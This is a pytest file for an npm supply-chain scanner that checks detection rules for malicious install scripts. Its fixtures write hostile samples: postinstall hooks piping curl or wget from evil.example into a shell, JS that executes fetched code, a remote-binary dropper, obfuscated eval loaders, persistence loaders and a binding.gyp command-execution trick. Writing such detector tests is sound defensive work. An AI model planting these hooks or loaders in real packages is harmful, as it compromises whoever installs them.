# SPDX-License-Identifier: AGPL-3.0-or-later
from __future__ import annotations

import json
from pathlib import Path

from pkgward.ecosystems.npm.installer import analyze_install_scripts


def _write_pkg(tmp_path: Path, manifest: dict, files: dict[str, str] | None = None) -> Path:
    """Create an extracted npm tarball layout: <root>/package/package.json."""
    pkg = tmp_path / "package"
    pkg.mkdir(parents=True, exist_ok=True)
    (pkg / "package.json").write_text(json.dumps(manifest))
    for rel, content in (files or {}).items():
        target = pkg / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content)
    return tmp_path


def _rule_ids(findings) -> set[str]:
    return {f.rule_id for f in findings}


def test_clean_benign_postinstall_no_findings(tmp_path):
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0",
                                 "scripts": {"postinstall": "node-gyp rebuild"}})
    assert analyze_install_scripts(root) == []


def test_no_scripts_no_findings(tmp_path):
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0"})
    assert analyze_install_scripts(root) == []


def test_postinstall_net_exec_critical(tmp_path):
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0", "scripts": {
        "postinstall": "curl http://evil.example/i.sh -o /tmp/i && sh -c /tmp/i"}})
    f = analyze_install_scripts(root)
    assert "installer.npm_lifecycle_net_exec" in _rule_ids(f)
    assert any(x.severity == "critical" for x in f)


def test_install_network_only_high(tmp_path):
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0", "scripts": {
        "preinstall": "curl https://evil.example/beacon -o /dev/null"}})
    f = analyze_install_scripts(root)
    assert "installer.npm_lifecycle_network" in _rule_ids(f)


def test_install_subprocess_only_medium(tmp_path):
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0", "scripts": {
        "install": "sh -c 'rm -rf /tmp/build'"}})
    f = analyze_install_scripts(root)
    assert "installer.npm_lifecycle_subprocess" in _rule_ids(f)


def test_benign_tool_chain_suppressed(tmp_path):
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0", "scripts": {
        "prepare": "rimraf dist && tsc && webpack --mode production"}})
    assert analyze_install_scripts(root) == []


def test_referenced_js_net_exec_critical(tmp_path):
    root = _write_pkg(
        tmp_path,
        {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node scripts/pi.js"}},
        files={"scripts/pi.js":
               "const https=require('https');const cp=require('child_process');"
               "https.get('http://evil.example',r=>{r.on('data',d=>cp.exec(d.toString()))});"},
    )
    f = analyze_install_scripts(root)
    assert "installer.npm_install_script_net_exec" in _rule_ids(f)


def test_referenced_js_encoded_payload(tmp_path):
    blob = "A" * 240
    root = _write_pkg(
        tmp_path,
        {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node ./build.js"}},
        files={"build.js": f"const p='{blob}';module.exports=p;"},
    )
    f = analyze_install_scripts(root)
    assert "installer.npm_install_script_encoded_payload" in _rule_ids(f)


def test_suspicious_bin_flagged(tmp_path):
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0",
                                 "bin": {"x": "scripts/install.sh"}})
    f = analyze_install_scripts(root)
    assert "installer.npm_suspicious_bin" in _rule_ids(f)


def test_flat_layout_root_manifest(tmp_path):
    # Manifest directly at the extracted root (no package/ dir).
    (tmp_path / "package.json").write_text(json.dumps(
        {"name": "x", "version": "1.0.0",
         "scripts": {"postinstall": "wget http://evil.example/x | sh -c cat"}}))
    f = analyze_install_scripts(tmp_path)
    assert "installer.npm_lifecycle_net_exec" in _rule_ids(f)


def test_node_modules_manifest_ignored(tmp_path):
    # A bundled dependency manifest must NOT be treated as an install hook.
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0"})
    dep = tmp_path / "package" / "node_modules" / "evil"
    dep.mkdir(parents=True)
    (dep / "package.json").write_text(json.dumps(
        {"name": "evil", "scripts": {"postinstall": "curl http://evil.example | sh -c cat"}}))
    assert analyze_install_scripts(root) == []


# --- Remote-binary dropper (download -> write -> chmod-exec), host-aware ---

_DROPPER_JS = """
const https = require('https');
const fs = require('fs');
const { execSync } = require('child_process');
const URL = '__HOST__/download/veteran/v1.0.2/veteran_linux_amd64.tar.gz';
function dl(u, dest) {
  const file = fs.createWriteStream(dest);
  https.get(u, (res) => { res.pipe(file); });
}
dl(URL, '/tmp/bin');
fs.chmodSync('/tmp/bin', 0o755);
execSync('/tmp/bin version');
"""


def _dropper(host: str) -> str:
    return _DROPPER_JS.replace("__HOST__", host)


def test_dropper_untrusted_host_high(tmp_path):
    # veteran-style: repo claims github, binary pulled from an unrelated host.
    root = _write_pkg(
        tmp_path,
        {"name": "veteran", "version": "1.0.10",
         "repository": {"type": "git", "url": "git+https://github.com/veteran-cli/veteran.git"},
         "scripts": {"postinstall": "node install.js"}},
        {"install.js": _dropper("https://laogou.us")},
    )
    f = analyze_install_scripts(root)
    drop = [x for x in f if x.rule_id == "installer.npm_install_remote_binary_drop"]
    assert len(drop) == 1 and drop[0].severity == "high"
    assert "laogou.us" in drop[0].evidence


def test_dropper_from_declared_repo_host_not_flagged(tmp_path):
    # downloading the binary from the package's OWN github repo = native-wrapper norm
    root = _write_pkg(
        tmp_path,
        {"name": "mytool", "version": "1.0.0",
         "repository": {"url": "https://github.com/myorg/mytool"},
         "scripts": {"postinstall": "node install.js"}},
        {"install.js": _dropper("https://github.com/myorg/mytool/releases")},
    )
    f = analyze_install_scripts(root)
    assert "installer.npm_install_remote_binary_drop" not in _rule_ids(f)


def test_dropper_from_github_universal_not_flagged(tmp_path):
    root = _write_pkg(
        tmp_path,
        {"name": "mytool", "version": "1.0.0",
         "scripts": {"postinstall": "node install.js"}},
        {"install.js": _dropper("https://objects.githubusercontent.com")},
    )
    f = analyze_install_scripts(root)
    assert "installer.npm_install_remote_binary_drop" not in _rule_ids(f)


def test_dropper_dynamic_url_medium(tmp_path):
    js = (
        "const https=require('https');const fs=require('fs');\n"
        "const u=process.env.BASE+'/bin.tgz';\n"
        "const f=fs.createWriteStream('/tmp/b');https.get(u,r=>r.pipe(f));\n"
        "fs.chmodSync('/tmp/b',0o755);\n"
    )
    root = _write_pkg(
        tmp_path,
        {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}},
        {"install.js": js},
    )
    f = analyze_install_scripts(root)
    drop = [x for x in f if x.rule_id == "installer.npm_install_remote_binary_drop"]
    assert len(drop) == 1 and drop[0].severity == "medium"


def test_download_without_chmod_not_a_dropper(tmp_path):
    js = (
        "const https=require('https');const fs=require('fs');\n"
        "const f=fs.createWriteStream('/tmp/data.json');\n"
        "https.get('https://laogou.us/data.json', r=>r.pipe(f));\n"
    )
    root = _write_pkg(
        tmp_path,
        {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}},
        {"install.js": js},
    )
    f = analyze_install_scripts(root)
    assert "installer.npm_install_remote_binary_drop" not in _rule_ids(f)


# --- obfuscated self-decoding entrypoint (@redhat-cloud-services worm, June 2026) ---

def test_install_obfuscated_charcode_entrypoint_critical(tmp_path):
    # preinstall runs a local script that Caesar(char-codes)->eval's its payload
    js = ("try{eval(function(s,n){return s.replace(/[a-z]/g,c=>String.fromCharCode("
          "(c.charCodeAt(0)-97+n)%26+97))}('ogmbq',12))}catch(e){}\n")
    root = _write_pkg(
        tmp_path,
        {"name": "x", "version": "1.0.0", "scripts": {"preinstall": "node index.js"}},
        {"index.js": js},
    )
    f = analyze_install_scripts(root)
    obf = [x for x in f if x.rule_id == "installer.npm_install_obfuscated_entrypoint"]
    assert len(obf) == 1 and obf[0].severity == "critical"


def test_install_obfuscated_decrypt_entrypoint_critical(tmp_path):
    js = ("const c=require('crypto');const d=c.createDecipheriv('aes-128-gcm',k,iv);"
          "new Function(d.update(ct).toString())();\n")
    root = _write_pkg(
        tmp_path,
        {"name": "x", "version": "1.0.0", "scripts": {"preinstall": "node index.js"}},
        {"index.js": js},
    )
    assert "installer.npm_install_obfuscated_entrypoint" in _rule_ids(analyze_install_scripts(root))


def test_benign_referenced_js_no_obfuscated_entrypoint(tmp_path):
    js = "const cfg=require('./config.json');console.log(cfg.version);\n"
    root = _write_pkg(
        tmp_path,
        {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node setup.js"}},
        {"setup.js": js},
    )
    assert "installer.npm_install_obfuscated_entrypoint" not in _rule_ids(analyze_install_scripts(root))


# --- resident-agent loader (logger-active / utils-terminal stealer family) ---

def test_install_persistence_loader_critical(tmp_path):
    # postinstall loader: registers OS persistence AND detaches a bg process
    js = (
        "const {spawn}=require('child_process');const fs=require('fs');const path=require('path');\n"
        "spawn(process.execPath,[__filename,'--bg'],{detached:true,stdio:'ignore'}).unref();\n"
        "fs.writeFileSync(path.join(home,'.config','systemd','user','agent.service'), unit);\n"
        "spawn('systemctl',['--user','enable','agent.service']);\n"
    )
    root = _write_pkg(
        tmp_path,
        {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node utils.js"}},
        {"utils.js": js},
    )
    pl = [x for x in analyze_install_scripts(root) if x.rule_id == "installer.npm_install_persistence_loader"]
    assert len(pl) == 1 and pl[0].severity == "critical"


def test_install_persistence_only_high(tmp_path):
    js = "const fs=require('fs');fs.writeFileSync(home+'/Library/LaunchAgents/x.plist', p);\n"
    root = _write_pkg(
        tmp_path,
        {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node setup.js"}},
        {"setup.js": js},
    )
    ids = _rule_ids(analyze_install_scripts(root))
    assert "installer.npm_install_persistence" in ids
    assert "installer.npm_install_persistence_loader" not in ids  # no detached spawn


def test_benign_postinstall_no_persistence_findings(tmp_path):
    js = "const cfg=require('./config.json');console.log(cfg.name);\n"
    root = _write_pkg(
        tmp_path,
        {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node setup.js"}},
        {"setup.js": js},
    )
    ids = _rule_ids(analyze_install_scripts(root))
    assert not (ids & {"installer.npm_install_persistence_loader",
                       "installer.npm_install_persistence",
                       "installer.npm_install_detached_spawn"})


def test_binding_gyp_command_exec_phantom_gyp(tmp_path):
    # The exact node-gyp command-expansion technique (Phantom Gyp / Miasma).
    gyp = ('{ "targets": [ { "target_name": "Setup", "type": "none", '
           '"sources": ["<!(node index.js > /dev/null 2>&1 && echo stub.c)"] } ] }')
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0"}, {"binding.gyp": gyp})
    findings = analyze_install_scripts(root)
    hits = [f for f in findings if f.rule_id == "installer.npm_binding_gyp_command_exec"]
    assert hits and hits[0].severity == "critical"


def test_binding_gyp_legit_config_read_no_finding(tmp_path):
    # Legit native modules read a config value — must NOT flag.
    gyp = ('{ "targets": [ { "include_dirs": ['
           '"<!(node -p \\"require(\'node-addon-api\').include\\")", '
           '"<!@(node -p \\"require(\'nan\').include\\")"] } ] }')
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0"}, {"binding.gyp": gyp})
    ids = {f.rule_id for f in analyze_install_scripts(root)}
    assert "installer.npm_binding_gyp_command_exec" not in ids


def test_runtime_obfuscated_main_entrypoint_critical(tmp_path):
    """turbo-dls 1.3.5: the malicious loader is the package `main` (gifted.js), which
    runs at require/CLI time — not an install hook — so every install-time rule
    missed it and the LLM (with the payload still encoded) went inconclusive. A
    self-decoding eval loader shipped AS the entry point is malware-grade."""
    loader = ("let X;!function(){const A=" + ",".join(str(i % 90 + 33) for i in range(120))
              + ";return eval(String.fromCharCode.apply(null,A))}();")
    root = _write_pkg(tmp_path, {"name": "turbo-dls", "version": "1.3.5", "main": "gifted.js"},
                      {"gifted.js": loader})
    ids = _rule_ids(analyze_install_scripts(root))
    assert "installer.npm_runtime_obfuscated_entrypoint" in ids


def test_runtime_obfuscated_bin_entrypoint_critical(tmp_path):
    """A downloader CLI: the loader is a `bin` target, run via the CLI, never required."""
    loader = ("const A=" + ",".join(str(i % 90 + 33) for i in range(120))
              + ";eval(String.fromCharCode.apply(null,A));")
    root = _write_pkg(tmp_path, {"name": "dl", "version": "1.0.0", "bin": {"dl": "cli.js"}},
                      {"cli.js": loader})
    ids = _rule_ids(analyze_install_scripts(root))
    assert "installer.npm_runtime_obfuscated_entrypoint" in ids


def test_runtime_entrypoint_minified_bundle_not_flagged(tmp_path):
    """FP guard: a legitimately minified bundle declared as `main` (dist/index.min.js)
    uses fromCharCode + eval too — the build-bundle discriminator must suppress it."""
    bundle = ("const A=" + ",".join(str(i % 90 + 33) for i in range(120))
              + ";eval(String.fromCharCode.apply(null,A));")
    root = _write_pkg(tmp_path,
                      {"name": "lib", "version": "1.0.0", "main": "dist/index.min.js"},
                      {"dist/index.min.js": bundle})
    ids = _rule_ids(analyze_install_scripts(root))
    assert "installer.npm_runtime_obfuscated_entrypoint" not in ids


def test_runtime_entrypoint_clean_main_no_finding(tmp_path):
    """A normal readable main entry produces no runtime-entrypoint finding."""
    root = _write_pkg(tmp_path, {"name": "ok", "version": "1.0.0", "main": "index.js"},
                      {"index.js": "module.exports = function add(a, b) { return a + b; };\n"})
    ids = _rule_ids(analyze_install_scripts(root))
    assert "installer.npm_runtime_obfuscated_entrypoint" not in ids


def test_runtime_entrypoint_compiled_binary_not_flagged(tmp_path):
    """@hellyeah/cli-darwin-arm64 FP: a `bin` entry that is a Bun/esbuild-style
    compiled NATIVE binary is not a JS loader. Read as text, the embedded JS bundle +
    engine trivially match the char-code/eval heuristic. The magic-byte guard must
    suppress the rule here — the binary is covered by binary.compiled_artifact +
    detonation + threat-intel. The two tests above prove a REAL JS loader still fires,
    so the guard narrows the rule without creating a malware blind spot."""
    root = _write_pkg(tmp_path, {"name": "@x/cli-darwin-arm64", "version": "1.0.0",
                                 "bin": {"x": "bin/x"}})
    binp = root / "package" / "bin" / "x"
    binp.parent.mkdir(parents=True, exist_ok=True)
    # Mach-O 64-bit (swapped) magic, then bytes that WOULD fire the rule as text.
    binp.write_bytes(
        b"\xcf\xfa\xed\xfe\x0c\x00\x00\x01"
        + b"const A=[" + b",".join([b"42"] * 120) + b"];"
        + b"eval(String.fromCharCode.apply(null,A));"
    )
    ids = _rule_ids(analyze_install_scripts(root))
    assert "installer.npm_runtime_obfuscated_entrypoint" not in ids
